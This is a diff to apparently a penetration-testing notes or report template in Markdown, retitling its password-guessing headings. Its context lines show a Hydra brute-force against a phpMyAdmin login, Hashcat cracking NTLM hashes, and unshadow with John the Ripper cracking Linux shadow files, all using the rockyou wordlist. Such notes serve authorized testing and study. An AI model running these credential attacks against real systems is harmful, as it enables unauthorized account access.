@@ -19,8 +19,10 @@
   * [OS](#os)
 * [Exploit](#exploit)
   * [Password Guessing](#password-guessing) 
-    * [Online Password Guessing](#online-password-guessing)
-    * [Offline Password Guessing](#offline-password-guessing)
+    * [Default Credentials](#default-credentials)
+    * [Hydra](#hydra)
+    * [Hashcat](#hashcat)
+    * [John the Ripper](#john-the-ripper)
   * [CVE-2021-1234](#cve-2021-1234) 
     * [EDB-ID-56789](#edb-id-56789)
     * [cyberphor POC](#cyberphor-poc)
@@ -220,7 +222,7 @@ NSTR
 
 # Exploit
 ## Password Guessing
-### Online Password Guessing
+### Hydra
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
 
@@ -228,13 +230,13 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmy
 NSTR
 ```
 
-### Offline Password Guessing
+### Hashcat
 Hashcat
 ```bash
 hashcat -m 1000 -a 0 --force --show $HASHDUMP /usr/share/wordlists/rockyou.txt 
 ```
 
-John the Ripper
+### John the Ripper
 ```bash
 unshadow $PASSWD_FILE $SHADOW_FILE > $HASHDUMP
 john $HASHDUMP --wordlist=/usr/share/wordlists/rockyou.txt
